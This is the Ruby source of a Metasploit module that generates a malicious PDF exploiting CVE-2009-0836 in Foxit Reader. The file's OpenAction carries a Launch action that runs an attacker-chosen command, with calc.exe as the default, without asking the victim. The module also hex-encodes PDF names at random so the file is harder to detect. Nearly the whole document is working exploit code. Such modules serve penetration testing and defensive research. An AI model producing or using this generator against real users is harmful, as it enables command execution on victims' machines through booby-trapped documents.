##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Foxit Reader Authorization Bypass',
        'Description' => %q{
          This module exploits an authorization bypass vulnerability in Foxit Reader
          build 1120. When an attacker creates a specially crafted pdf file containing
          an Open/Execute action, arbitrary commands can be executed without confirmation
          from the victim.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
        'References' => [
          [ 'CVE', '2009-0836' ],
          [ 'OSVDB', '55615'],
          [ 'BID', '34035' ],
        ],
        'DisclosureDate' => '2009-03-09',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.pdf'])
      ]
    )
  end

  def run
    exec = datastore['CMD']

    # Create the pdf
    pdf = make_pdf(exec)

    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(pdf)
  end

  # https://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def n_obfu(str)
    result = ''
    str.scan(/./u) do |c|
      if (rand(2) == 0) && (c.upcase >= 'A') && (c.upcase <= 'Z')
        result << '#%x' % c.unpack('C*')[0]
      else
        result << c
      end
    end
    result
  end

  def random_non_ascii_string(count)
    result = ''
    count.times do
      result << rand(128..255).chr
    end
    result
  end

  def io_def(id)
    '%d 0 obj' % id
  end

  def io_ref(id)
    '%d 0 R' % id
  end

  def make_pdf(exec)
    xref = []
    eol = "\x0d\x0a"
    endobj = 'endobj' << eol

    # Randomize PDF version?
    pdf = "%%PDF-#{rand(1..2)}.#{rand(1..2)}" << eol
    pdf << '%' << random_non_ascii_string(4) << eol
    xref << pdf.length
    pdf << io_def(1) << n_obfu('<</Type/Catalog/Outlines ') << io_ref(2) << n_obfu('/Pages ') << io_ref(3) << n_obfu('/OpenAction ') << io_ref(5) << '>>' << endobj
    xref << pdf.length
    pdf << io_def(2) << n_obfu('<</Type/Outlines/Count 0>>') << endobj
    xref << pdf.length
    pdf << io_def(3) << n_obfu('<</Type/Pages/Kids[') << io_ref(4) << n_obfu(']/Count 1>>') << endobj
    xref << pdf.length
    pdf << io_def(4) << n_obfu('<</Type/Page/Parent ') << io_ref(3) << n_obfu('/MediaBox[0 0 612 792]>>') << endobj
    xref << pdf.length
    pdf << io_def(5) << "<</Type/Action/S/Launch/F << /F(#{exec})>>/NewWindow true\n" + io_ref(6) + '>>' << endobj
    xref << pdf.length
    pdf << endobj
    xref_position = pdf.length
    pdf << 'xref' << eol
    pdf << '0 %d' % (xref.length + 1) << eol
    pdf << '0000000000 65535 f' << eol
    xref.each do |index|
      pdf << '%010d 00000 n' % index << eol
    end
    pdf << 'trailer' << n_obfu('<</Size %d/Root ' % (xref.length + 1)) << io_ref(1) << '>>' << eol
    pdf << 'startxref' << eol
    pdf << xref_position.to_s << eol
    pdf << '%%EOF' << eol
  end
end
